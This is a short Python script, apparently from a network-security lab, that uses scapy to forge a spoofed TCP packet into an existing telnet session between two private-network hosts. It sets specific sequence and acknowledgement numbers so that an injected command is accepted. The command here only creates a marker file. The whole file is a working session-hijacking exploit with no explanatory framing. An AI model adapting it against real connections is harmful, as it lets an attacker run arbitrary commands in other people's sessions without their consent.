#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=41556, dport=23, flags="A", seq=3264262210, ack=224211160)
data = "\r touch /tmp/hijacked.txt\r"

pkt = ip / tcp / data
send(pkt, verbose=0)
